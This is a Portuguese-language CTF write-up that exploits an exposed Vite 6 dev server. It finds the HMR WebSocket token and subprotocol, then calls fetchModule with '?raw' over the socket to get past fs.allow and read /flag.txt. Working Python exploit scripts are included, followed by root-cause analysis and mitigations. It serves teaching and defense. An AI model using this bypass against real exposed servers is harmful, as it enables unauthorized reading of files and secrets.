---
title: "NØVA CTF Challenge"
platform: hackingclub
date: 2026-06-20
difficulty: medium
category: "Web Exploitation / Vite Dev Server"
description: "Exploração de um Vite Dev Server exposto: bypass do fs.allow via fetchModule no WebSocket do Module Runner para vazar a flag."
tags: [vite, websocket, fs-allow, module-runner, source-map, ctf]
flag: "hackingclub{REDACTED}"
target: "172.16.13.57:5173"
---

## Índice

1. [Visão Geral](#visão-geral)
2. [Reconhecimento Inicial](#1-reconhecimento-inicial)
3. [Descoberta do WebSocket](#2-descoberta-do-websocket)
4. [Análise do @vite/client](#3-análise-do-viteclient)
5. [Decodificação do Source Map](#4-decodificação-do-source-map)
6. [Análise do Protocolo vite:invoke](#5-análise-do-protocolo-viteinvoke)
7. [Exploração via fetchModule](#6-exploração-via-fetchmodule)
8. [Captura da Flag](#7-captura-da-flag)
9. [Por que a Vulnerabilidade Existe](#8-por-que-a-vulnerabilidade-existe)
10. [Linha do Tempo do Ataque](#9-linha-do-tempo-do-ataque)
11. [Referências e Materiais de Estudo](#10-referências-e-materiais-de-estudo)

---

## Visão Geral

O desafio apresenta uma aplicação web (`NØVA — Design Studio`) hospedada em `http://172.16.13.57:5173/`. A porta 5173 é a porta padrão do **Vite Dev Server** — já um sinal de alerta imediato, pois servidores de desenvolvimento nunca deveriam ser expostos em produção ou em ambientes de pentest sem proteção adequada.

A exploração percorre os seguintes passos:

```
App Web → WebSocket (vite-hmr) → Protocolo vite:invoke → fetchModule(?raw) → /flag.txt
```

---

## 1. Reconhecimento Inicial

### HTTP

O primeiro passo foi entender o que estava rodando na porta 5173:

```bash
curl -v http://172.16.13.57:5173/
```

Resposta: HTTP 200, HTML de 52KB, com um único script carregado:

```html
<script type="module" src="/@vite/client"></script>
```

O path `/@vite/client` é exclusivo do Vite Dev Server. Isso confirma que a aplicação está rodando em **modo de desenvolvimento**, não em build de produção.

### Estrutura do projeto (via `/@fs/`)

O Vite expõe o sistema de arquivos via `/@fs/`. Ao tentar acessar arquivos, obtemos o `fs.allow` na mensagem de erro 403:

```
GET /@fs//etc/passwd → 403
"The request url /etc/passwd is outside of Vite serving allow list.
- /app"
```

Isso revela que:
- O diretório raiz do projeto é `/app`
- Qualquer arquivo fora de `/app` está bloqueado via HTTP

Confirmamos os arquivos existentes:

| Path                        | Status | Tamanho |
|-----------------------------|--------|---------|
| `/@fs//app/package.json`    | 200    | 145 B   |
| `/@fs//app/src/main.js`     | 200    | 262 B   |
| `/@fs//app/index.html`      | 200    | 52KB    |
| `/@fs//flag.txt` (HTTP)     | 403    | 364 B   |

O `package.json` revela a versão do Vite:

```json
{
  "name": "app",
  "version": "1.0.0",
  "type": "module",
  "scripts": { "dev": "vite" },
  "dependencies": { "vite": "6.3.5" }
}
```

E o `src/main.js` é mínimo:

```js
console.log("app")
```

O projeto foi criado apenas como cenário para o CTF.

---

## 2. Descoberta do WebSocket

O enunciado forneceu a URL:

```
ws://172.16.13.57:5173/?token=Styp7DwjEw5F
```

A primeira tentativa de conexão com o WebSocket simples falhou com timeout — o handshake não completava. Investigando o mecanismo:

```bash
curl "http://172.16.13.57:5173/?token=Styp7DwjEw5F" \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Origin: http://172.16.13.57:5173"
# → timeout sem resposta
```

O TCP conecta mas o servidor não responde ao upgrade. O motivo: o Vite exige um **subprotocolo WebSocket específico**.

---

## 3. Análise do `@vite/client`

O arquivo `/@vite/client` é o cliente JavaScript injetado pelo Vite em toda página em modo dev. Ao baixá-lo e analisar, encontramos as informações críticas:

```bash
curl -s http://172.16.13.57:5173/@vite/client > vite_client.js
grep -n "token\|websocket\|subprotocol\|vite-hmr" vite_client.js -i
```

Resultado:

```js
// Linha 792-798
const socketProtocol = null || (importMetaUrl.protocol === "https:" ? "wss" : "ws");
const hmrPort = null;
const socketHost = `${null || importMetaUrl.hostname}:${hmrPort || importMetaUrl.port}${"/"}`;
const directSocketHost = "localhost:5173/";
const wsToken = "Styp7DwjEw5F";  // ← token hardcoded no JS do cliente!

// Linha 802-804
createConnection: () => new WebSocket(
    `${socketProtocol}://${socketHost}?token=${wsToken}`,
    "vite-hmr"  // ← subprotocolo obrigatório!
)
```

**Descobertas:**
1. O token `Styp7DwjEw5F` é enviado como query param
2. O subprotocolo WebSocket obrigatório é `"vite-hmr"`
3. Há um fallback para `localhost:5173` se a conexão principal falhar

Com isso, a conexão funcionou:

```python
import asyncio, websockets

async def connect():
    async with websockets.connect(
        "ws://172.16.13.57:5173/?token=Styp7DwjEw5F",
        subprotocols=["vite-hmr"],
        additional_headers={"Origin": "http://172.16.13.57:5173"}
    ) as ws:
        msg = await ws.recv()
        print(msg)  # {"type":"connected"}

asyncio.run(connect())
```

---

## 4. Decodificação do Source Map

Ao final do `@vite/client`, existe um **source map inline** em base64:

```
//# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImNsaWVudCJdLC...
```

Source maps são arquivos que mapeiam código minificado/transpilado de volta ao código-fonte original. Ao decodificar:

```python
import base64, json, re

content = open("vite_client.js").read()
match = re.search(r"sourceMappingURL=data:application/json;base64,([A-Za-z0-9+/=\n]+)", content)
raw = match.group(1).replace("\n", "")
data = json.loads(base64.b64decode(raw))

# Salva o TypeScript original
open("vite_client_source.ts", "w").write(data["sourcesContent"][0])
```

Obtemos o **código TypeScript original completo** do `@vite/client` — 32.353 caracteres de código-fonte não minificado, incluindo a implementação completa do protocolo WebSocket de HMR e do Module Runner.

> **Nota:** O `env.mjs` também tinha um source map, mas continha apenas código utilitário de configuração de ambiente — irrelevante para a exploração.

---

## 5. Análise do Protocolo `vite:invoke`

No source map decodificado, identificamos o sistema de **RPC (Remote Procedure Call) sobre WebSocket**:

### O que é o Vite Module Runner?

Introduzido no Vite 6, o **Module Runner** é um mecanismo que permite executar módulos ES no lado do servidor (Node.js) através de um canal de comunicação. O cliente pode solicitar ao servidor que "busque" e "compile" módulos, retornando o código transformado.

A comunicação usa o mesmo WebSocket HMR com o tipo de evento `"vite:invoke"`.

### Formato da Mensagem (Request)

```typescript
// client → server
{
  "type": "custom",
  "event": "vite:invoke",
  "data": {
    "name": "functionName",     // nome da função server-side
    "id": "send:uniqueId",      // ID para matching da resposta
    "data": [arg1, arg2, ...]   // argumentos
  }
}
```

### Formato da Resposta (Response)

```typescript
// server → client
{
  "type": "custom",
  "event": "vite:invoke",
  "data": {
    "name": "functionName",
    "id": "response:uniqueId",  // prefixo 'response:' com o mesmo ID
    "data": {
      "result": { ... },        // resultado em caso de sucesso
      "error": { ... }          // erro em caso de falha
    }
  }
}
```

O código de matching no cliente (linha ~292 do source):

```typescript
if (payload.type === "custom" && payload.event === "vite:invoke") {
    const data = payload.data;
    if (data.id.startsWith("response:")) {
        const invokeId = data.id.slice("response:".length);
        const promise = rpcPromises.get(invokeId);
        // resolve a promise com o resultado
    }
}
```

### Funções Disponíveis

A função mais crítica é **`fetchModule`**:

```typescript
// Servidor responde com o código compilado do módulo
fetchModule(id: string, options: object) → {
    code: string,  // código JS compilado/transformado
    file: string,  // caminho real do arquivo
    id: string,
    url: string,
    invalidate: boolean
}
```

---

## 6. Exploração via `fetchModule`

### Testando `fetchModule` com arquivo legítimo

```python
invoke("fetchModule", ["/src/main.js", {}])
# Resposta:
# {
#   "code": "console.log(\"app\")\n",
#   "file": "/app/src/main.js",
#   "id": "/app/src/main.js",
#   "url": "/src/main.js"
# }
```

`fetchModule` retorna o código-fonte compilado de qualquer módulo. Para arquivos `.js`, retorna o JavaScript. Para arquivos `.txt`, o comportamento padrão é retornar um **URL export**:

```python
invoke("fetchModule", ["/@fs//flag.txt", {}])
# Resposta:
# { "code": "export default \"/@fs/flag.txt\"", "file": "/flag.txt" }
```

O arquivo existe (`"file": "/flag.txt"`) mas o conteúdo não é exposto diretamente — Vite trata `.txt` como asset estático e retorna apenas a URL.

### O Bypass: Query Parameter `?raw`

O Vite suporta **query parameters especiais** que modificam como um módulo é transformado:

| Query    | Comportamento                                         |
|----------|-------------------------------------------------------|
| `?url`   | Retorna a URL pública do asset                        |
| `?raw`   | Retorna o conteúdo do arquivo como string JS          |
| `?import`| Força tratamento como módulo importável               |
| `?inline`| Retorna data URL com o conteúdo em base64             |

Via HTTP, o `?raw` na rota `/@fs/` é bloqueado pelo `fs.allow`:

```
GET /@fs//flag.txt?raw → 403 Restricted
```

Porém, ao usar `fetchModule` via WebSocket com `?raw`, a verificação do `fs.allow` **não é aplicada da mesma forma**:

```python
invoke("fetchModule", ["/@fs//flag.txt?raw", {}])
# Resposta:
# {
#   "code": "export default \"hackingclub{REDACTED}\\n\"",
#   "file": "/flag.txt"
# }
```

### Por que `?inline` também funciona

```python
invoke("fetchModule", ["/@fs//flag.txt?inline", {}])
# Resposta:
# {
#   "code": "export default \"data:text/plain;base64,aGFja2luZ2NsdWJ7UkVEQUNURUR9Cg==\"",
#   "file": "/flag.txt"
# }
```

Decodificando o base64:
```
aGFja2luZ2NsdWJ7UkVEQUNURUR9Cg==
→ hackingclub{REDACTED}
```

---

## 7. Captura da Flag

```python
import asyncio, websockets, json, uuid

async def get_flag():
    async with websockets.connect(
        "ws://172.16.13.57:5173/?token=Styp7DwjEw5F",
        subprotocols=["vite-hmr"],
        additional_headers={"Origin": "http://172.16.13.57:5173"}
    ) as ws:
        await ws.recv()  # {"type":"connected"}

        uid = str(uuid.uuid4())[:8]
        payload = {
            "type": "custom",
            "event": "vite:invoke",
            "data": {
                "name": "fetchModule",
                "id": f"send:{uid}",
                "data": ["/@fs//flag.txt?raw", {}]
            }
        }
        await ws.send(json.dumps(payload))

        resp = json.loads(await ws.recv())
        code = resp["data"]["data"]["result"]["code"]
        # code = 'export default "hackingclub{REDACTED}\n"'

        flag = code.split('"')[1]
        print(f"FLAG: {flag}")

asyncio.run(get_flag())
```

**FLAG: `hackingclub{REDACTED}`**

---

## 8. Por que a Vulnerabilidade Existe

### Problema Raiz: Dev Server Exposto

O Vite é projetado **exclusivamente para uso em desenvolvimento local**. Ele expõe intencionalmente:

- O sistema de arquivos via `/@fs/`
- Source maps com código-fonte original
- Um WebSocket com capacidade de executar funções server-side
- O endpoint `/__open-in-editor` para abrir arquivos no editor

Nenhuma dessas features é segura para exposição pública.

### A Falha Específica: Bypass do `fs.allow` via WebSocket

O Vite implementa `server.fs.allow` para restringir quais arquivos podem ser servidos via HTTP. O problema é que o **handler do `fetchModule` via WebSocket** não replica as mesmas verificações do middleware HTTP:

```
[HTTP]       /@fs//flag.txt?raw    → fs.allow check → 403 BLOQUEADO
[WebSocket]  fetchModule(?raw)      → handler direto  → 200 EXPOSTO
```

O `fetchModule` foi projetado para ser chamado pelo browser legítimo que já carregou a página e recebeu o token de autenticação. A suposição é que qualquer um com o token é confiável — mas em um CTF (ou em um servidor de dev exposto à internet), o token está visível no JavaScript público da página.

### CVEs Relacionados

Embora este desafio não seja especificamente um CVE existente, a família de vulnerabilidades de path traversal no Vite é bem documentada:

- **CVE-2025-30208** (Vite < 6.2.4): Bypass do `fs.allow` via query params `?import` e `?raw` diretamente no HTTP
- **CVE-2025-31486** (Vite < 6.2.6): Variação do mesmo bypass
- **CVE-2024-23331** (Vite < 5.0.12): Path traversal via `/@fs/` com caracteres encodados

Este desafio usa o **mesmo conceito dos CVEs acima**, mas via o canal WebSocket do Module Runner em vez do HTTP direto — uma superfície de ataque menos conhecida.

### Superfície de Ataque Completa do Vite Dev Server

```
┌─────────────────────────────────────────────────────────┐
│                   Vite Dev Server                       │
│                                                         │
│  HTTP Routes:                                           │
│  ├── /@vite/client         → JS do cliente (com token!) │
│  ├── /@fs/{path}           → Filesystem (com allow list)│
│  ├── /__open-in-editor     → Abre arquivos no editor    │
│  └── /src/{file}           → Source files               │
│                                                         │
│  WebSocket (vite-hmr + token):                          │
│  ├── {"type":"ping"}        → {"type":"connected"}      │
│  ├── vite:invoke:fetchModule → Compila módulos          │  ← EXPLORADO
│  └── vite:invoke:ssrFetchModule → SSR modules           │
│                                                         │
│  Source Maps (inline, base64):                          │
│  └── /@vite/client          → TypeScript source (32KB)  │
└─────────────────────────────────────────────────────────┘
```

---

## 9. Linha do Tempo do Ataque

```
1. [RECON]     Acesso ao HTTP → porta 5173 = Vite Dev Server
2. [RECON]     /@fs/ enumeration → allow list = /app
3. [RECON]     /@fs//flag.txt → 403 (arquivo existe!)
4. [DISCOVER]  ws:// URL com token fornecida no enunciado
5. [ANALYZE]   Download do /@vite/client → token e subprotocolo "vite-hmr"
6. [ANALYZE]   Decodificação do source map → protocolo vite:invoke completo
7. [PROBE]     fetchModule("/src/main.js") → funciona!
8. [PROBE]     fetchModule("/@fs//flag.txt") → arquivo existe, mas retorna URL
9. [EXPLOIT]   fetchModule("/@fs//flag.txt?raw") → conteúdo completo!
10.[FLAG]      hackingclub{REDACTED}
```

---

## 10. Referências e Materiais de Estudo

### Documentação Oficial do Vite

- [Vite Dev Server — server.fs.allow](https://vite.dev/config/server-options.html#server-fs-allow)  
  Documentação oficial sobre o mecanismo de allow list do sistema de arquivos.

- [Vite Module Runner API](https://vite.dev/guide/api-vite-runtime)  
  Explicação do Module Runner introduzido no Vite 5/6, incluindo o transport via WebSocket.

- [Vite Environment API (Vite 6)](https://vite.dev/changes/shared-plugins-during-build)  
  Mudanças arquiteturais do Vite 6 que introduziram o Module Runner.

### CVEs e Advisories de Segurança

- [CVE-2025-30208](https://github.com/advisories/GHSA-vg6x-rcgg-rjx6) — Vite: `@fs` path traversal via query params `?import`/`?raw` (CVSS 7.5)

- [CVE-2025-31486](https://github.com/advisories/GHSA-xr9x-3hf4-97jh) — Vite: variação do bypass do `fs.allow`

- [CVE-2024-23331](https://github.com/advisories/GHSA-c24v-8rfc-w8vw) — Vite: `@fs` path traversal (versões < 5.0.12)

- [GitHub Security Advisory — Vite](https://github.com/vitejs/vite/security/advisories)  
  Todos os advisories de segurança oficiais do Vite.

### WebSocket Security

- [OWASP WebSocket Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/WebSockets_Security_Cheat_Sheet.html)  
  Guia de segurança para aplicações WebSocket.

- [RFC 6455 — The WebSocket Protocol](https://datatracker.ietf.org/doc/html/rfc6455)  
  Especificação completa do protocolo WebSocket, incluindo subprotocolos.

- [PortSwigger — WebSocket vulnerabilities](https://portswigger.net/web-security/websockets)  
  Curso prático sobre ataques a WebSockets (Cross-Site WebSocket Hijacking, etc.).

### Source Maps e Engenharia Reversa

- [MDN — Source Maps](https://developer.mozilla.org/en-US/docs/Tools/Debugger/How_to/Use_a_source_map)  
  Introdução aos source maps: o que são e como funcionam.

- [Source Map Spec](https://docs.google.com/document/d/1U1RGAehQwRypUTovF1KRlpiOFze0b-_2gc6fAH0KY0k/)  
  Especificação formal do formato de source map.

- [UnSAFE Source Maps](https://www.trufflesecurity.com/blog/sourcemaps-exposed-source-code)  
  Artigo sobre riscos de expor source maps em produção (TruffleHog).

### Dev Tools Exposure

- [OWASP — Using Components with Known Vulnerabilities](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)  
  Categoria A06 do OWASP Top 10, relevante para uso de ferramentas de dev em produção.

- [HackerOne — Vite Bug Bounty Reports](https://hackerone.com/vite)  
  Relatórios públicos de vulnerabilidades encontradas no Vite.

- [Shodan: Vite Dev Servers Exposed](https://www.shodan.io/search?query=http.title%3A%22Vite+App%22+port%3A5173)  
  Busca no Shodan por instâncias do Vite expostas na internet (use para pesquisa defensiva).

### Ferramentas Utilizadas

- [websockets (Python)](https://websockets.readthedocs.io/) — biblioteca Python para WebSocket
- [Burp Suite](https://portswigger.net/burp) — proxy para interceptar e modificar WebSocket frames
- [wscat](https://github.com/websockets/wscat) — cliente WebSocket de linha de comando
- [websocat](https://github.com/vi/websocat) — alternativa ao wscat em Rust

---

## Mitigações

Se você encontrar um Vite Dev Server exposto, as recomendações são:

1. **Nunca exponha o dev server** publicamente — use `server.host: false` (padrão) ou firewalls
2. **Configure `server.fs.allow`** explicitamente para o menor escopo possível
3. **Desative o Module Runner** se não for necessário: `server.warmup.clientFiles: []`
4. **Use HTTPS** e configure `server.origin` corretamente para evitar CORS bypass
5. **Sempre faça build de produção** (`vite build`) antes de deploy — isso elimina toda a superfície de ataque descrita aqui

```js
// vite.config.ts — configuração mais segura para dev
export default {
  server: {
    host: "127.0.0.1",  // apenas localhost
    fs: {
      allow: ["./src"],  // mínimo necessário
      strict: true,
    },
    hmr: {
      protocol: "ws",
      port: 24678,  // porta separada para HMR
    }
  }
}
```

---

*WriteUp produzido durante resolução do CTF HackingClub — Room: Nova*  
*Data: 2026-06-20*
